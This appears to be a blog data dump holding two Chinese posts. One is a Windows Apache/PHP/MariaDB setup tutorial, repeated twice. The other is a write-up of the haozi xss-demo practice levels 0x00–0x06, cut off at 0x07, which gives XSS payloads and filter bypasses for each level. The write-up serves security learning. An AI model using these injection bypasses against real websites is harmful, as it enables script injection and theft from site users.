src=\"https://i.imgur.com/0YLPYL3.png\" alt=\"18\"></p>\n<p>重新输入<code>httpd.exe -k install</code>,你也可以按方向键的↑,它记录了历史输入,找到<code>httpd.exe -k install</code>后回车执行。</p>\n<p><img src=\"https://i.imgur.com/Ndq3QvL.png\" alt=\"19\"></p>\n<p>提示Apache2.4安装成功。</p>\n<p>安装成功后按Windows+R键,输入<code>services.msc</code>快捷打开系统服务。</p>\n<p><img src=\"https://i.imgur.com/JUpD4GF.png\" alt=\"20\"></p>\n<p>找到<code>Apache2.4</code></p>\n<p><img src=\"https://i.imgur.com/k1y7ybF.png\" alt=\"21\"></p>\n<p>点击后右键属性修改启动类型为手动。</p>\n<p><img src=\"https://i.imgur.com/P5cwtUi.png\" alt=\"22\"></p>\n<p>点击启动后,Apache2.4会运行。</p>\n<p>如果你出现和我下图一样的错误,可以查看解决办法,没有出现该问题可不看这步</p>\n<p><img src=\"https://i.imgur.com/QADrjLI.png\" alt=\"23\"></p>\n<p>在我的安装目录<code>C:\\WAMP\\Apache24\\bin</code>下有个<code>httpd.exe</code>,用cmd让他执行,它会提示错误信息。</p>\n<p><img src=\"https://i.imgur.com/z8AJr2m.png\" alt=\"24\"></p>\n<p><img src=\"https://i.imgur.com/eigfN7c.png\" alt=\"25\"></p>\n<font color=\"red\">\n错误原因:httpd.conf里面配置的ServerRoot路径跟实际路径不一致，导致路径无效。\n</font>\n\n<p>在你的安装路径的<code>Apache24\\</code>底下有个<code>conf</code>文件夹,进入到该目录。有个<code>httpd.conf</code>文件。<code>httpd.conf</code>文件包含了Apache的配置。用编辑器打开<code>httpd.conf</code>,我用的是EditPlus,什么编辑器都没有的话就用自带的记事本打开。</p>\n<p><img src=\"https://i.imgur.com/QfySGgM.png\" alt=\"26\"></p>\n<p>找到提示错误的39行</p>\n<p><img src=\"https://i.imgur.com/S5nUOVU.png\" alt=\"27\"></p>\n<p>其实是38行需要修改,修改成如下图配置,它其实记录了<code>Apache24\\</code>的路径,它默认配置是在C盘根目录的<code>Apache24\\</code>,一旦你把<code>Apache24\\</code>放在别的地方都需要改动这个配置。这里我添加上<code>C:\\WAMP</code>,显示如下。也就是说如果你的路径在<code>D:\\Apache24</code>下面就填<code>D:\\Apache24</code>。</p>\n<p><img src=\"https://i.imgur.com/nw4tNUj.png\" alt=\"28\"></p>\n<p>修改记得保存,启动Apache2.4成功</p>\n<p><img src=\"https://i.imgur.com/EXJwtuV.png\" alt=\"29\"></p>\n<p>随便打开个浏览器输入</p>\n<p><code>http://localhost/</code></p>\n<p>如果返回如下界面就表示配置成功,Apache这一关就算过了。</p>\n<p><img src=\"https://i.imgur.com/MxKHSo4.png\" alt=\"30\"></p>\n<h2 id=\"PHP-安装及配置\"><a href=\"#PHP-安装及配置\" class=\"headerlink\" title=\"PHP 安装及配置\"></a>PHP 安装及配置</h2><h3 id=\"解压\"><a href=\"#解压\" class=\"headerlink\" title=\"解压\"></a>解压</h3><p>将php的压缩解压,当前目录下多出了php开头的文件夹,重命名为php后拷贝到<code>C:\\WAMP</code></p>\n<p><img src=\"https://i.imgur.com/X1jc6ey.png\" alt=\"31\"></p>\n<p><img src=\"https://i.imgur.com/rNmAYLv.png\" alt=\"32\"></p>\n<h3 id=\"选择配置文件\"><a href=\"#选择配置文件\" class=\"headerlink\" title=\"选择配置文件\"></a>选择配置文件</h3><p>双击进入php文件夹,有两个配置文件<code>php.ini-development</code>和<code>php.ini-production</code>。</p>\n<p><img src=\"https://i.imgur.com/1RTQN4W.png\" alt=\"33\"></p>\n<p>要使用哪个就把文件名修改成<code>php.ini</code>就行。<code>php.ini-production</code>在参数配置上更具有安全性,适合产品上线使用,学习环境下使用<code>php.ini-development</code>就行了。这里将<code>php.ini-development</code>改成<code>php.ini</code>。</p>\n<p>用文本编辑器打开改名的<code>php.ini</code>。</p>\n<h3 id=\"开启扩展模块\"><a href=\"#开启扩展模块\" class=\"headerlink\" title=\"开启扩展模块\"></a>开启扩展模块</h3><p>搜索<code>extension_dir</code>,大概在730行左右。</p>\n<p><img src=\"https://i.imgur.com/9bi5KDp.png\" alt=\"34\"></p>\n<p>配置文件中<code>;</code>的作用是注释,要开启某个配置需要把开头的<code>;</code>去掉。<br>这里配置的是php的扩展目录,该目录文件为PHP提供一些扩展的功能。可以查看下该目录。</p>\n<p><img src=\"https://i.imgur.com/AI7j3y3.png\" alt=\"36\"></p>\n<p>将该路径复制到“”中,并把开头启注释作用的<code>;</code>去掉。这里的路径填写你自己的路径。</p>\n<p><img src=\"https://i.imgur.com/46N7GV9.png\" alt=\"35\"></p>\n<p>修改之后PHP就能找到扩展文件所在的目录了,但是这些找到的扩展文件没有启用,需要手动配置。现在启用mysql数据库扩展,在<code>php.ini</code>中搜索<code>mysqli</code></p>\n<p><img src=\"https://i.imgur.com/H4zCLcW.png\" alt=\"37\"></p>\n<p>大概在897行</p>\n<p><code>;extension=mysqli</code></p>\n<p>去掉<code>;</code>开启mysql数据库扩展</p>\n<p><img src=\"https://i.imgur.com/rv8U8iZ.png\" alt=\"38\"></p>\n<p>保存并退出。</p>\n<h2 id=\"Apache-连接-PHP\"><a href=\"#Apache-连接-PHP\" class=\"headerlink\" title=\"Apache 连接 PHP\"></a>Apache 连接 PHP</h2><h3 id=\"概述-1\"><a href=\"#概述-1\" class=\"headerlink\" title=\"概述\"></a>概述</h3><p>将Apache安装好和PHP安装配置好后并不表示Apache和PHP关联起来了,还要配置Apache的配置文件<code>httpd.conf</code>让Apache认识PHP。</p>\n<h3 id=\"Apache加载PHP模块\"><a href=\"#Apache加载PHP模块\" class=\"headerlink\" title=\"Apache加载PHP模块\"></a>Apache加载PHP模块</h3><p>我的Apache配置文件在<code>C:\\WAMP\\Apache24\\conf</code>下,用编辑器打开。</p>\n<p><img src=\"https://i.imgur.com/5OHHMYx.png\" alt=\"39\"></p>\n<p>找到183行左右,这是加载模块的最后一行</p>\n<p><img src=\"https://i.imgur.com/Ruuy221.png\" alt=\"40\"></p>\n<p>添加下面两句话</p>\n<p>LoadModule php7\\_module \"<font color=\"red\">C:\\WAMP\\php</font>\\php7apache2_4.dll\"</p><p>\n\n</p><p>PHPIniDir \"<font color=\"red\">C:\\WAMP</font>\\php\"</p><p>\n\n</p><p>红色部分修改为你的路径</p>\n<p><img src=\"https://i.imgur.com/oACAJzi.png\" alt=\"41\"></p>\n<p>第一句话加载了PHP模块</p>\n<p>第二句添加了<code>php.ini</code>所在的目录</p>\n<h3 id=\"Apache解析PHP\"><a href=\"#Apache解析PHP\" class=\"headerlink\" title=\"Apache解析PHP\"></a>Apache解析PHP</h3><p>找435行左右</p>\n<p><img src=\"https://i.imgur.com/Gof1i6b.png\" alt=\"42\"></p>\n<p>添加</p>\n<p><code>AddHandler application/x-httpd-php .php</code></p>\n<p><img src=\"https://i.imgur.com/myPKwea.png\" alt=\"43\"></p>\n<p>保存并退出</p>\n<p>重新启动Apache</p>\n<p><img src=\"https://i.imgur.com/iD6KxBm.png\" alt=\"44\"></p>\n<h3 id=\"测试是否正常解析PHP文件\"><a href=\"#测试是否正常解析PHP文件\" class=\"headerlink\" title=\"测试是否正常解析PHP文件\"></a>测试是否正常解析PHP文件</h3><p>进入<code>Apache24\\</code>下的<code>htdocs</code>目录,新建一个<code>phpinfo.php</code>的php文件</p>\n<p><img src=\"https://i.imgur.com/70SPdg3.png\" alt=\"45\"></p>\n<p>编辑<code>phpinfo.php</code>内容</p>\n<p><img src=\"https://i.imgur.com/XIGNqcV.png\" alt=\"46\"></p>\n<p><code>&lt;?php\n​    phpinfo();\n?&gt;</code></p>\n<p>删除该目录下的<code>index.html</code>文件,因为它会妨碍目录显示。访问<code>localhost</code></p>\n<p><img src=\"https://i.imgur.com/7rNLnrk.png\" alt=\"47\"></p>\n<p>打开<code>phpinfo.php</code>文件,显示如下则解析成功。</p>\n<p><img src=\"https://i.imgur.com/IWz1Lw2.png\" alt=\"48\"></p>\n<h2 id=\"MYSQL-安装及测试\"><a href=\"#MYSQL-安装及测试\" class=\"headerlink\" title=\"MYSQL 安装及测试\"></a>MYSQL 安装及测试</h2><h3 id=\"MYSQL安装\"><a href=\"#MYSQL安装\" class=\"headerlink\" title=\"MYSQL安装\"></a>MYSQL安装</h3><p><img src=\"https://i.imgur.com/dkEp5De.png\" alt=\"49\"></p>\n<p>双击安装</p>\n<p><img src=\"https://i.imgur.com/VVm8POP.png\" alt=\"50\"></p>\n<p>建立数据库用户,这里我建立账户名用户名都为root</p>\n<p><img src=\"https://i.imgur.com/mphJYjl.png\" alt=\"51\"></p>\n<p><img src=\"https://i.imgur.com/YBbIiAH.png\" alt=\"52\"></p>\n<p>默认就行</p>\n<h3 id=\"测试数据库是否安装成功\"><a href=\"#测试数据库是否安装成功\" class=\"headerlink\" title=\"测试数据库是否安装成功\"></a>测试数据库是否安装成功</h3><p>新建<code>mysql.php</code></p>\n<p><img src=\"https://i.imgur.com/9trRZo4.png\" alt=\"53\"></p>\n<p>下面的username填你刚才创建的用户名,password填你刚创建的密码。</p>\n<p>数据库测试代码:</p>\n<pre><code>&lt;?php\n    $servername = &quot;localhost&quot;;\n    $username = &quot;root&quot;;\n    $password = &quot;root&quot;;\n\n    // 创建连接\n    $conn = new mysqli($servername, $username, $password);\n\n    // 检测连接\n    if ($conn-&gt;connect_error) {\n        die(&quot;fail: &quot; . $conn-&gt;connect_error);\n    } \n    echo &quot;success&quot;;\n?&gt;</code></pre><p><img src=\"https://i.imgur.com/9y23zfv.png\" alt=\"54\"></p>\n<p>双击运行</p>\n<p><img src=\"https://i.imgur.com/dQtf4AN.png\" alt=\"55\"></p>\n<p>返回success表示数据库安装成功</p>\n<p><img src=\"https://i.imgur.com/H0doqgq.png\" alt=\"56\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"windows下PHP环境的搭建\"><a href=\"#windows下PHP环境的搭建\" class=\"headerlink\" title=\"windows下PHP环境的搭建\"></a>windows下PHP环境的搭建</h1><hr>\n<h2 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h2><p>windows下的PHP环境简称WAMP（windows+Apache+MySQL+PHP）</p>\n<p>PHP的环境搭建需要安装Apache+MySQL+PHP,还需要进行相关配置。与集成开发环境相比,WAMP的过程相对繁琐,那么可以使用phpstudy这样的开发环境。</p>\n<p>下面MySQL数据库使用用MariaDB,它是MySQL源代码的一个分支,与MySQL使用基本相同,在MySQL被甲骨文收购后随时存在闭源的风险的情况下,他是一个很好的替代品。</p>\n<p>下载地址:</p>\n<ul>\n<li><a href=\"https://httpd.apache.org/download.cgi#apache24\" target=\"_blank\" rel=\"noopener\">Apache</a></li>\n<li><a href=\"http://www.php.net/\" target=\"_blank\" rel=\"noopener\">PHP</a> </li>\n<li><a href=\"https://downloads.mariadb.org/\" target=\"_blank\" rel=\"noopener\">MariaDB</a></li>\n</ul>\n<p>安装顺序按照Apache—&gt;PHP—&gt;MySQL进行。</p>\n<h2 id=\"安装包准备\"><a href=\"#安装包准备\" class=\"headerlink\" title=\"安装包准备\"></a>安装包准备</h2><h3 id=\"Apache\"><a href=\"#Apache\" class=\"headerlink\" title=\"Apache\"></a>Apache</h3><p>点击上面的下载地址进入Apache官网</p>\n<p><img src=\"https://i.imgur.com/7zAnKFy.png\" alt=\"1\"></p>\n<p><img src=\"https://i.imgur.com/edi2Whn.png\" alt=\"2\"></p>\n<p><img src=\"https://i.imgur.com/uKZSvyc.png\" alt=\"3\"></p>\n<p>根据你的windows操作系统位数选择安装包</p>\n<h3 id=\"PHP\"><a href=\"#PHP\" class=\"headerlink\" title=\"PHP\"></a>PHP</h3><p>点击上面的下载地址进入PHP官网</p>\n<p><img src=\"https://i.imgur.com/EUeJCvu.png\" alt=\"4\"></p>\n<p>选择最新版链接下载进入PHP官网</p>\n<p><img src=\"https://i.imgur.com/Jo2tRgC.png\" alt=\"5\"></p>\n<p><img src=\"https://i.imgur.com/7m2gZiA.png\" alt=\"6\"></p>\n<p>根据你的windows操作系统位数选择安装包</p>\n<h3 id=\"MariaDB\"><a href=\"#MariaDB\" class=\"headerlink\" title=\"MariaDB\"></a>MariaDB</h3><p>点击上面的下载地址进入MariaDB官网</p>\n<p><img src=\"https://i.imgur.com/q3BIl6H.png\" alt=\"7\"></p>\n<p><img src=\"https://i.imgur.com/FTeAPYX.png\" alt=\"8\"></p>\n<p>根据你的windows操作系统位数选择安装包</p>\n<h3 id=\"结果\"><a href=\"#结果\" class=\"headerlink\" title=\"结果\"></a>结果</h3><p><img src=\"https://i.imgur.com/1OWP6zr.png\" alt=\"9\"></p>\n<h2 id=\"Apache-安装\"><a href=\"#Apache-安装\" class=\"headerlink\" title=\"Apache 安装\"></a>Apache 安装</h2><blockquote>\n<p>将http开头的安装包解压,多出一个<code>Apache24</code>的文件夹</p>\n</blockquote>\n<p><img src=\"https://i.imgur.com/Vcy2Nmm.png\" alt=\"10\"></p>\n<blockquote>\n<p>将<code>Apache24</code>放在你想要放的任何位置,为了方便管理,我在C盘新建一个目录<code>WAMP</code>,把<code>Apache24</code>放进去。之后也把所有的安装放在这里</p>\n</blockquote>\n<p><img src=\"https://i.imgur.com/RvNhCf4.png\" alt=\"11\"></p>\n<p>进入到<code>Apache24\\bin</code></p>\n<p><img src=\"https://i.imgur.com/cU7NZIa.png\" alt=\"12\"></p>\n<font color=\"red\">\n​    将上图地址栏标记的的地址复制\n​    \n    `C:\\WAMP\\Apache24\\bin`\n</font>\n\n<p><img src=\"https://i.imgur.com/PzSG47T.png\" alt=\"13\"></p>\n<p>鼠标移到<code>cmd</code>上,右键以管理员身份运行</p>\n<p><img src=\"https://i.imgur.com/q3TSCMY.png\" alt=\"14\"></p>\n<p>输入<code>cd</code>(注意这有个空格) 并把刚才复制的<code>C:\\WAMP\\Apache24\\bin</code>粘贴上去,回车运行</p>\n<p><img src=\"https://i.imgur.com/UyPn696.png\" alt=\"15\"></p>\n<p>可以看到路径改变了,再输入<code>httpd.exe -k install</code>,执行安装过程。</p>\n<p><img src=\"https://i.imgur.com/ULVsMlk.png\" alt=\"16\"></p>\n<p>如果出现了上图的错误,是因为Win7系统是缺少了VC++2015组件,Win10系统就不会出现这个问题。</p>\n<p>cmd窗口先别关闭。点下面的连接下载组件</p>\n<p><a href=\"https://www.microsoft.com/zh-CN/download/details.aspx?id=48145\" target=\"_blank\" rel=\"noopener\">VC++2015组件</a></p>\n<p><img src=\"https://i.imgur.com/2A5ZNpn.png\" alt=\"17\"></p>\n<p>我是Win7 32位系统就选择32位的(64位就选64位的),然后点next。</p>\n<p>把下载好的安装程序双击运行。同意安装直到安装成功。</p>\n<p><img src=\"https://i.imgur.com/0YLPYL3.png\" alt=\"18\"></p>\n<p>重新输入<code>httpd.exe -k install</code>,你也可以按方向键的↑,它记录了历史输入,找到<code>httpd.exe -k install</code>后回车执行。</p>\n<p><img src=\"https://i.imgur.com/Ndq3QvL.png\" alt=\"19\"></p>\n<p>提示Apache2.4安装成功。</p>\n<p>安装成功后按Windows+R键,输入<code>services.msc</code>快捷打开系统服务。</p>\n<p><img src=\"https://i.imgur.com/JUpD4GF.png\" alt=\"20\"></p>\n<p>找到<code>Apache2.4</code></p>\n<p><img src=\"https://i.imgur.com/k1y7ybF.png\" alt=\"21\"></p>\n<p>点击后右键属性修改启动类型为手动。</p>\n<p><img src=\"https://i.imgur.com/P5cwtUi.png\" alt=\"22\"></p>\n<p>点击启动后,Apache2.4会运行。</p>\n<p>如果你出现和我下图一样的错误,可以查看解决办法,没有出现该问题可不看这步</p>\n<p><img src=\"https://i.imgur.com/QADrjLI.png\" alt=\"23\"></p>\n<p>在我的安装目录<code>C:\\WAMP\\Apache24\\bin</code>下有个<code>httpd.exe</code>,用cmd让他执行,它会提示错误信息。</p>\n<p><img src=\"https://i.imgur.com/z8AJr2m.png\" alt=\"24\"></p>\n<p><img src=\"https://i.imgur.com/eigfN7c.png\" alt=\"25\"></p>\n<font color=\"red\">\n错误原因:httpd.conf里面配置的ServerRoot路径跟实际路径不一致，导致路径无效。\n</font>\n\n<p>在你的安装路径的<code>Apache24\\</code>底下有个<code>conf</code>文件夹,进入到该目录。有个<code>httpd.conf</code>文件。<code>httpd.conf</code>文件包含了Apache的配置。用编辑器打开<code>httpd.conf</code>,我用的是EditPlus,什么编辑器都没有的话就用自带的记事本打开。</p>\n<p><img src=\"https://i.imgur.com/QfySGgM.png\" alt=\"26\"></p>\n<p>找到提示错误的39行</p>\n<p><img src=\"https://i.imgur.com/S5nUOVU.png\" alt=\"27\"></p>\n<p>其实是38行需要修改,修改成如下图配置,它其实记录了<code>Apache24\\</code>的路径,它默认配置是在C盘根目录的<code>Apache24\\</code>,一旦你把<code>Apache24\\</code>放在别的地方都需要改动这个配置。这里我添加上<code>C:\\WAMP</code>,显示如下。也就是说如果你的路径在<code>D:\\Apache24</code>下面就填<code>D:\\Apache24</code>。</p>\n<p><img src=\"https://i.imgur.com/nw4tNUj.png\" alt=\"28\"></p>\n<p>修改记得保存,启动Apache2.4成功</p>\n<p><img src=\"https://i.imgur.com/EXJwtuV.png\" alt=\"29\"></p>\n<p>随便打开个浏览器输入</p>\n<p><code>http://localhost/</code></p>\n<p>如果返回如下界面就表示配置成功,Apache这一关就算过了。</p>\n<p><img src=\"https://i.imgur.com/MxKHSo4.png\" alt=\"30\"></p>\n<h2 id=\"PHP-安装及配置\"><a href=\"#PHP-安装及配置\" class=\"headerlink\" title=\"PHP 安装及配置\"></a>PHP 安装及配置</h2><h3 id=\"解压\"><a href=\"#解压\" class=\"headerlink\" title=\"解压\"></a>解压</h3><p>将php的压缩解压,当前目录下多出了php开头的文件夹,重命名为php后拷贝到<code>C:\\WAMP</code></p>\n<p><img src=\"https://i.imgur.com/X1jc6ey.png\" alt=\"31\"></p>\n<p><img src=\"https://i.imgur.com/rNmAYLv.png\" alt=\"32\"></p>\n<h3 id=\"选择配置文件\"><a href=\"#选择配置文件\" class=\"headerlink\" title=\"选择配置文件\"></a>选择配置文件</h3><p>双击进入php文件夹,有两个配置文件<code>php.ini-development</code>和<code>php.ini-production</code>。</p>\n<p><img src=\"https://i.imgur.com/1RTQN4W.png\" alt=\"33\"></p>\n<p>要使用哪个就把文件名修改成<code>php.ini</code>就行。<code>php.ini-production</code>在参数配置上更具有安全性,适合产品上线使用,学习环境下使用<code>php.ini-development</code>就行了。这里将<code>php.ini-development</code>改成<code>php.ini</code>。</p>\n<p>用文本编辑器打开改名的<code>php.ini</code>。</p>\n<h3 id=\"开启扩展模块\"><a href=\"#开启扩展模块\" class=\"headerlink\" title=\"开启扩展模块\"></a>开启扩展模块</h3><p>搜索<code>extension_dir</code>,大概在730行左右。</p>\n<p><img src=\"https://i.imgur.com/9bi5KDp.png\" alt=\"34\"></p>\n<p>配置文件中<code>;</code>的作用是注释,要开启某个配置需要把开头的<code>;</code>去掉。<br>这里配置的是php的扩展目录,该目录文件为PHP提供一些扩展的功能。可以查看下该目录。</p>\n<p><img src=\"https://i.imgur.com/AI7j3y3.png\" alt=\"36\"></p>\n<p>将该路径复制到“”中,并把开头启注释作用的<code>;</code>去掉。这里的路径填写你自己的路径。</p>\n<p><img src=\"https://i.imgur.com/46N7GV9.png\" alt=\"35\"></p>\n<p>修改之后PHP就能找到扩展文件所在的目录了,但是这些找到的扩展文件没有启用,需要手动配置。现在启用mysql数据库扩展,在<code>php.ini</code>中搜索<code>mysqli</code></p>\n<p><img src=\"https://i.imgur.com/H4zCLcW.png\" alt=\"37\"></p>\n<p>大概在897行</p>\n<p><code>;extension=mysqli</code></p>\n<p>去掉<code>;</code>开启mysql数据库扩展</p>\n<p><img src=\"https://i.imgur.com/rv8U8iZ.png\" alt=\"38\"></p>\n<p>保存并退出。</p>\n<h2 id=\"Apache-连接-PHP\"><a href=\"#Apache-连接-PHP\" class=\"headerlink\" title=\"Apache 连接 PHP\"></a>Apache 连接 PHP</h2><h3 id=\"概述-1\"><a href=\"#概述-1\" class=\"headerlink\" title=\"概述\"></a>概述</h3><p>将Apache安装好和PHP安装配置好后并不表示Apache和PHP关联起来了,还要配置Apache的配置文件<code>httpd.conf</code>让Apache认识PHP。</p>\n<h3 id=\"Apache加载PHP模块\"><a href=\"#Apache加载PHP模块\" class=\"headerlink\" title=\"Apache加载PHP模块\"></a>Apache加载PHP模块</h3><p>我的Apache配置文件在<code>C:\\WAMP\\Apache24\\conf</code>下,用编辑器打开。</p>\n<p><img src=\"https://i.imgur.com/5OHHMYx.png\" alt=\"39\"></p>\n<p>找到183行左右,这是加载模块的最后一行</p>\n<p><img src=\"https://i.imgur.com/Ruuy221.png\" alt=\"40\"></p>\n<p>添加下面两句话</p>\n<p>LoadModule php7\\_module \"<font color=\"red\">C:\\WAMP\\php</font>\\php7apache2_4.dll\"</p><p>\n\n</p><p>PHPIniDir \"<font color=\"red\">C:\\WAMP</font>\\php\"</p><p>\n\n</p><p>红色部分修改为你的路径</p>\n<p><img src=\"https://i.imgur.com/oACAJzi.png\" alt=\"41\"></p>\n<p>第一句话加载了PHP模块</p>\n<p>第二句添加了<code>php.ini</code>所在的目录</p>\n<h3 id=\"Apache解析PHP\"><a href=\"#Apache解析PHP\" class=\"headerlink\" title=\"Apache解析PHP\"></a>Apache解析PHP</h3><p>找435行左右</p>\n<p><img src=\"https://i.imgur.com/Gof1i6b.png\" alt=\"42\"></p>\n<p>添加</p>\n<p><code>AddHandler application/x-httpd-php .php</code></p>\n<p><img src=\"https://i.imgur.com/myPKwea.png\" alt=\"43\"></p>\n<p>保存并退出</p>\n<p>重新启动Apache</p>\n<p><img src=\"https://i.imgur.com/iD6KxBm.png\" alt=\"44\"></p>\n<h3 id=\"测试是否正常解析PHP文件\"><a href=\"#测试是否正常解析PHP文件\" class=\"headerlink\" title=\"测试是否正常解析PHP文件\"></a>测试是否正常解析PHP文件</h3><p>进入<code>Apache24\\</code>下的<code>htdocs</code>目录,新建一个<code>phpinfo.php</code>的php文件</p>\n<p><img src=\"https://i.imgur.com/70SPdg3.png\" alt=\"45\"></p>\n<p>编辑<code>phpinfo.php</code>内容</p>\n<p><img src=\"https://i.imgur.com/XIGNqcV.png\" alt=\"46\"></p>\n<p><code>&lt;?php\n​    phpinfo();\n?&gt;</code></p>\n<p>删除该目录下的<code>index.html</code>文件,因为它会妨碍目录显示。访问<code>localhost</code></p>\n<p><img src=\"https://i.imgur.com/7rNLnrk.png\" alt=\"47\"></p>\n<p>打开<code>phpinfo.php</code>文件,显示如下则解析成功。</p>\n<p><img src=\"https://i.imgur.com/IWz1Lw2.png\" alt=\"48\"></p>\n<h2 id=\"MYSQL-安装及测试\"><a href=\"#MYSQL-安装及测试\" class=\"headerlink\" title=\"MYSQL 安装及测试\"></a>MYSQL 安装及测试</h2><h3 id=\"MYSQL安装\"><a href=\"#MYSQL安装\" class=\"headerlink\" title=\"MYSQL安装\"></a>MYSQL安装</h3><p><img src=\"https://i.imgur.com/dkEp5De.png\" alt=\"49\"></p>\n<p>双击安装</p>\n<p><img src=\"https://i.imgur.com/VVm8POP.png\" alt=\"50\"></p>\n<p>建立数据库用户,这里我建立账户名用户名都为root</p>\n<p><img src=\"https://i.imgur.com/mphJYjl.png\" alt=\"51\"></p>\n<p><img src=\"https://i.imgur.com/YBbIiAH.png\" alt=\"52\"></p>\n<p>默认就行</p>\n<h3 id=\"测试数据库是否安装成功\"><a href=\"#测试数据库是否安装成功\" class=\"headerlink\" title=\"测试数据库是否安装成功\"></a>测试数据库是否安装成功</h3><p>新建<code>mysql.php</code></p>\n<p><img src=\"https://i.imgur.com/9trRZo4.png\" alt=\"53\"></p>\n<p>下面的username填你刚才创建的用户名,password填你刚创建的密码。</p>\n<p>数据库测试代码:</p>\n<pre><code>&lt;?php\n    $servername = &quot;localhost&quot;;\n    $username = &quot;root&quot;;\n    $password = &quot;root&quot;;\n\n    // 创建连接\n    $conn = new mysqli($servername, $username, $password);\n\n    // 检测连接\n    if ($conn-&gt;connect_error) {\n        die(&quot;fail: &quot; . $conn-&gt;connect_error);\n    } \n    echo &quot;success&quot;;\n?&gt;</code></pre><p><img src=\"https://i.imgur.com/9y23zfv.png\" alt=\"54\"></p>\n<p>双击运行</p>\n<p><img src=\"https://i.imgur.com/dQtf4AN.png\" alt=\"55\"></p>\n<p>返回success表示数据库安装成功</p>\n<p><img src=\"https://i.imgur.com/H0doqgq.png\" alt=\"56\"></p>\n"},{"title":"haozi/xss-demo笔记","date":"2018-10-08T13:59:54.000Z","_content":"\n# haozi/xss-demo笔记\n\n在线xss题目,用于xss学习,弹出alert(1)就过关.\n\n地址:https://xss.haozi.me\n\n项目: https://github.com/haozi/xss-demo ,有提供的答案https://github.com/haozi/xss-demo/issues/1\n\n自带alert(1)的js地址：https://xss.haozi.me/j.js\n\n# 0x00\n\n## server code:\n\n```\nfunction render (input) {\n  return '<div>' + input + '</div>'\n}\n```\n\n## 分析:\n\n```\n没有过滤,在<div>标签中输出\n```\n\n## input code:\n\n\n\n```\n1. <script>alert('1')</script>\n\n2. <script>alert`1`</script>\n\n3. 利用外联方式 \n<script src=https://xss.haozi.me/j.js></script>   \n\n4. 利用onerror事件,当src寻找的资源不存在发送错误弹框。\n<img src='' onerror='alert(1)'>\n\n5.  利用html的字符实体和SVG。\n    SVG意为可缩放矢量图形（Scalable Vector Graphics）。\n    SVG 使用 XML 格式定义图像。\n   <svg><script>alert&#x28;1&#x29;</script></svg>\n\n```\n\n## html:\n\n```\n   1. <div><script>alert('1')</script></div>\n   2. <div><script>alert`1`</script></div>\n   3. <div><script src=https://xss.haozi.me/j.js></script></div>\n   4. <div><img src='' onerror='alert(1)'></div>\n   5. <div><svg><script>alert&#x28;1&#x29;</script></svg></div>\n```\n\n![000](/img/xss/haozi/000.png)\n\n#  0x01\n\n## server code:\n\n```\nfunction render (input) {\n  return '<textarea>' + input + '</textarea>'\n}\n```\n\n## 分析:\n\n```\n在<textarea>中,没有过滤,构造闭合\n```\n\n## input code:\n\n```\n1. </textarea><script>alert('1')</script>\n```\n\n\n## html:\n\n ```\n1. <textarea></textarea><script>alert('1')</script></textarea>\n ```\n\n![001](/img/xss/haozi/001.png)\n\n# 0x02\n\n## server code:\n\n```\nfunction render (input) {\n  return '<input type=\"name\" value=\"' + input + '\">'\n}\n```\n\n## 分析:\n\n```\n在<input>中,没有过滤,双引号闭合,构造双引号闭合\n```\n\n## input code:\n\n```\n1. \"><script>alert('1')</script>\n```\n\n## html:\n\n```\n1. <input type=\"name\" value=\"\"><script>alert('1')</script>\">\n```\n\n\n\n![002](/img/xss/haozi/002.png)\n\n# 0x03\n\n## server code:\n\n```\nfunction render (input) {\n  const stripBracketsRe = /[()]/g\n  input = input.replace(stripBracketsRe, '')\n  return input\n}\n```\n\n## 分析:\n\n```\n过滤了(),想办法用其他方式代替()\n```\n\n## input code:\n\n```\n1. <script>alert`1`</script>\n2. \n    利用html的字符实体和SVG。\n    SVG意为可缩放矢量图形（Scalable Vector Graphics）。\n    SVG 使用 XML 格式定义图像。\n    <svg><script>alert&#x28;1&#x29;</script></svg>\n 3. 利用外联\n <script src=https://xss.haozi.me/j.js></script>\n 4. 利用img标签,结合onerrors事件,src资源不存在会触发错误。 \n <img src='' onerror=\"alert&#x28;&#x31;&#x29;\">\n \n\n```\n\n## html:\n\n```\n1. <script>alert`1`</script>\n2. <svg><script>alert&#x28;1&#x29;</script></svg>\n3. <script src=https://xss.haozi.me/j.js></script>\n4. <img src='' onerror=\"alert&#x28;&#x31;&#x29;\">\n```\n\n![003](/img/xss/haozi/003.png)\n\n# 0x04\n\n## server code:\n\n```\nfunction render (input) {\n  const stripBracketsRe = /[()`]/g\n  input = input.replace(stripBracketsRe, '')\n  return input\n}\n```\n\n## 分析:\n\n```\n多过滤了`\n```\n\n## input code:\n\n```\n1. \n    利用html的字符实体和SVG。\n    SVG意为可缩放矢量图形（Scalable Vector Graphics）。\n    SVG 使用 XML 格式定义图像。\n    <svg><script>alert&#x28;1&#x29;</script></svg>\n 2. 利用外联\n <script src=https://xss.haozi.me/j.js></script>\n 3. 利用img标签,结合onerrors事件,src资源不存在会触发错误。 \n <img src='' onerror=\"alert&#x28;&#x31;&#x29;\">\n \n\n```\n\n## html:\n\n```\n1. <svg><script>alert&#x28;1&#x29;</script></svg>\n2. <script src=https://xss.haozi.me/j.js></script>\n3. <img src='' onerror=\"alert&#x28;&#x31;&#x29;\">\n```\n\n\n\n![004](/img/xss/haozi/004.png)\n\n# 0x05\n\n## server code:\n\n```\nfunction render (input) {\n  input = input.replace(/-->/g, '😂')\n  return '<!-- ' + input + ' -->'\n}\n```\n\n## 分析:\n\n```\n构造闭合\n```\n\n## input code:\n\n```\n1. --!><script>alert(1)</script>\n\n```\n\n## html:\n\n```\n1. <!-- --!><script>alert(1)</script> -->\n```\n\n![005](/img/xss/haozi/005.png)\n\n# 0x06\n\n## server code:\n\n```\nfunction render (input) {\n  input = input.replace(/auto|on.*=|>/ig, '_')\n  return `<input value=1 ${input} type=\"text\">`\n}\n```\n\n## 分析:\n\n```\n过滤>和以auto开头或者on开头，=等号结尾的标签属性并替换成_，且忽略大小写；\n\n1. 可以先定义type='image',等价于img标签的方法了。 然后利用换行使=与onerror隔开\n2. 用on开头的触发事件\n```\n\n## input code:\n\n```\n1. \ntype='image' src='' onerror\n=alert(1)\n\n2.onmouseover\n=alert(1)\n\n```\n\n## html:\n\n```\n1. <input value=1 type='image' src='' onerror\n=alert(1) type=\"text\">\n2.<input value=1 onmouseover\n=alert(1) type=\"text\">\n```\n\n![006](/img/xss/haozi/006.png)\n\n# 0x07\n\n## server code:\n\n```\nfunction render (input) {\n  const stripTagsRe = /<\\/?[^>]+>/gi\n\n  input = input.replace(stripTagsRe, '')\n  return 